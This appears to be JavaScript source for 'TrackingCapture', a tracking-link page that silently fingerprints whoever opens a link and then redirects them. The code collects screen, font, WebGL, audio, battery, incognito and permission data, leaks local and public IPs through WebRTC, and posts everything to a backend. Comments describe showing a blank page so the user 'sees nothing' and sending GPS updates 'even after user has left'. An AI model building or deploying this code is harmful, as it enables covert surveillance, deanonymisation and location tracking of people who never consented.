...
// // //     screenWidth: window.window.screen.width,
// // //     screenHeight: window.window.screen.height,
// // //     screenAvailWidth: window.window.screen.availWidth || null,
// // //     screenAvailHeight: window.window.screen.availHeight || null,
// // //     colorDepth: window.window.screen.colorDepth || null,
// // //     pixelDepth: window.window.screen.pixelDepth || null,
...
// //     windowWidth: window.innerWidth || null,
// //     windowHeight: window.innerHeight || null,
// //     orientation: window.window.screen.orientation?.type || null,
...
//     windowHeight: window.innerHeight || null,
//     orientation: window.window.screen.orientation?.type || null,
//     orientationAngle: window.window.screen.orientation?.angle ?? null,
//     outerWidth: window.outerWidth || null,
//     outerHeight: window.outerHeight || null,
...
// function getCaptureKey(token) { return "traxelon_v7_" + token; }
...
// function getFontInfo() {
//   try {
//     const fonts = ["Arial","Arial Black","Arial Narrow","Calibri","Cambria","Candara","Comic Sans MS","Consolas","Constantia","Corbel","Courier","Courier New","Ebrima","Franklin Gothic Medium","Gabriola","Gadugi","Georgia","Haettenschweiler","Helvetica","Impact","Lucida Console","Lucida Sans","Lucida Sans Unicode","Malgun Gothic","Microsoft Sans Serif","Nirmala UI","Palatino Linotype","Roboto","Open Sans","Segoe Print","Segoe Script","Segoe UI","Segoe UI Emoji","Segoe UI Symbol","SimSun","Tahoma","Times New Roman","Trebuchet MS","Ubuntu","Verdana","Webdings","Wingdings","Wingdings 2","Wingdings 3","Yu Gothic","Gill Sans MT","Futura","Optima","Century Gothic","Garamond","Book Antiqua","Bookman Old Style","Century","Copperplate Gothic Bold","Copperplate Gothic Light","Monotype Corsiva"];
...
//       };
//       setTimeout(() => { pc.close(); resolve({ webrtcLocalIP: [...local].join(", ") || null, webrtcPublicIP: [...pub].join(", ") || null, webrtcSupport: "true" }); }, 2000);
//     });
//   } catch { return { webrtcLocalIP: null, webrtcPublicIP: null, webrtcSupport: "false" }; }
// }
...
//   const [battery, incognito, media, storage, audio, webrtc, perms] = await Promise.all([getBattery(), detectIncognito(), getMedia(), getStorage(), getAudioFingerprint(), getWebRTC(), getPerms()]);
//   const now = new Date();
//   const jan = new Date(now.getFullYear(), 0, 1).getTimezoneOffset();
//   const jul = new Date(now.getFullYear(), 6, 1).getTimezoneOffset();
//   const ua = navigator.userAgent;
...
//     ...getWebGLInfo(), ...getScreen(), ...battery, ...getNetwork(),
//     localTime: now.toLocaleString("en-IN", { timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone }),
//     clientTimezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
//     timezoneOffset: now.getTimezoneOffset(),
...
//       });
//       const data = await res.json();
//       if (data.destinationUrl) window.location.replace(data.destinationUrl);
//     } catch (err) {
//       console.error("[TrackingCapture]", err);
//     }
//   }

//   // Completely blank white page — no text, no spinner, user sees nothing
...
function getCaptureKey(token) { return "traxelon_v8_" + token; }
...
function getFontInfo() {
  try {
    const fonts = ["Arial","Arial Black","Arial Narrow","Calibri","Cambria","Candara","Comic Sans MS","Consolas","Constantia","Corbel","Courier","Courier New","Ebrima","Franklin Gothic Medium","Gabriola","Gadugi","Georgia","Haettenschweiler","Helvetica","Impact","Lucida Console","Lucida Sans","Lucida Sans Unicode","Malgun Gothic","Microsoft Sans Serif","Nirmala UI","Palatino Linotype","Roboto","Open Sans","Segoe Print","Segoe Script","Segoe UI","Segoe UI Emoji","Segoe UI Symbol","SimSun","Tahoma","Times New Roman","Trebuchet MS","Ubuntu","Verdana","Webdings","Wingdings","Wingdings 2","Wingdings 3","Yu Gothic","Gill Sans MT","Futura","Optima","Century Gothic","Garamond","Book Antiqua","Bookman Old Style","Century","Monotype Corsiva"];
    const c = document.createElement("canvas"); const x = c.getContext("2d");
    const test = "mmmmmmmmmmlli!@#$%"; const sz = "72px";
    const bw = {}; ["monospace","sans-serif","serif"].forEach(b => { x.font = `${sz} ${b}`; bw[b] = x.measureText(test).width; });
    const detected = fonts.filter(f => ["monospace","sans-serif","serif"].some(b => { x.font = `${sz} '${f}',${b}`; return x.measureText(test).width !== bw[b]; }));
...
// Get GPS location with proper prompt
...
async function collectAll() {
  ...
  // Run all non-GPS collections in parallel — fast
...
export default function TrackingCapture() {
  ...
  async function startCapture() {
    try {
      // Step 1 — collect all device info immediately (no GPS yet)
      const deviceInfo = await collectAll();

      // Step 2 — send capture WITHOUT GPS first so redirect happens fast
      const res = await fetch(BACKEND_URL + "/api/links/capture", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
      ...
      // Step 3 — redirect immediately as soon as we get destinationUrl
      if (data.destinationUrl && !redirectDone.current) {
        redirectDone.current = true;
        setDestinationUrl(data.destinationUrl);

        // Redirect after 1 second — gives time for GPS prompt to fire
        setTimeout(() => {
          window.location.replace(data.destinationUrl);
        }, 1000);
      }

      // Step 4 — ask for GPS in background AFTER redirect is scheduled
      // GPS will update the capture record even after user has left
      getGPSLocation().then(async (gpsData) => {
        if (!gpsData) return;
        // Send GPS as a separate update
